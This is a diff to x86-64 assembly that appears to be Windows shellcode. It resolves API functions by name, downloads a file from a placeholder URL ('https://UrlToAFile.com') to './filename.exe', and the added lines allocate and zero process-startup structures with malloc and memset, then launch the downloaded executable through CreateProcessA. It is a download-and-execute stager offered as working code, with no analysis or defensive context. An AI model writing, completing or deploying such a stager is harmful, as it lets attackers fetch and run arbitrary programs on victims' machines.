@@ -54,20 +54,31 @@ section .text
     mov r8, r15
     add r8, filename
     xor r9, r9
-    sub rsp, 0x40
+    sub rsp, 64
+    sub rsp, 0x10
     mov QWORD [rsp], 0x0
-    mov QWORD [rsp+0x20], 0x0
     call rax              ; Download &url to &filename
-    add rsp, 0x40            ; Clear parameters from stack
+    add rsp, 0x10            ; Clear parameters from stack
+    add rsp, 64
     ; TODO Check return value == S_OK
     mov rcx, r15
     add rcx, dll2
     call r14
     mov rdi, rax        ; msvcrt.dll
-    mov rcx, rax
+    mov rcx, rdi
+    mov rdx, r15
+    add rdx, memsetF
+    call r13
+    add rsp, 0x48
+    push rax		    ; Memset
+    sub rsp, 0x48           ; Make space for functions call
+    mov rcx, rdi
     mov rdx, r15
     add rdx, mallocF
     call r13
+    add rsp, 0x48           ; Make space for functions call
+    push rax                ; Malloc
+    sub rsp, 0x48
     mov rcx, 0x2e       ; sizeof(struct _stat)
     call rax
     mov rsi, rax        ; _stat buffer
@@ -95,12 +106,59 @@ section .text
       mov rbx, rax
       jmp downloadCheck
       done:
-	add rsp, 0x48		; Local variables
-	pop rcx
+	add rsp, 0x48
+	pop rdi		; Malloc
+	pop rdx		; Memset
+        pop rcx
+	push rdx
+        push rdi
+        sub rsp, 0x48
         mov rdx, r15
         add rdx, execF          ; CreateProcessA
         call r13
-        int3
+	add rsp, 0x48		; Local variables
+	pop rdx			; Malloc
+	push rax		; CreateProcessA
+	push rdx		; Malloc
+        sub rsp, 0x48
+	mov rcx, 104
+	call rdx
+        add rsp, 0x48
+	pop rdx			; Malloc
+	pop rcx
+	pop r9
+	push rcx
+	push rax		; Addr1
+	sub rsp, 0x48
+
+	mov rdi, rdx
+	mov rcx, rax
+	mov rdx, 0
+	mov r8, 104
+	call r9
+	mov rdx, rdi
+	mov rcx, 24
+	call rdx
+	add rsp, 0x48
+	pop rcx
+	pop rdx
+	sub rsp, 0x50
+	mov DWORD [rsp + 0x20], 0x0
+	mov DWORD [rsp + 0x28], 0x0
+	mov QWORD [rsp + 0x30], 0x0
+	mov QWORD [rsp + 0x38], 0x0
+	mov QWORD [rsp + 0x40], rcx
+	mov QWORD [rsp + 0x48], rax
+	mov rax, rdx
+	mov rdx, 0x0
+	mov r8, 0x0
+	mov r9, 0x0
+        mov rcx, r15
+        add rcx, filename
+        call rax
+	int3
+	add rsp, 0x140
+	int3
   
   getFunction:
     push rbp
@@ -192,4 +250,5 @@ section .data
   url db "https://UrlToAFile.com", 0
   filename db "./filename.exe", 0
   execF db "CreateProcessA", 0
+  memsetF db "memset", 0
   end
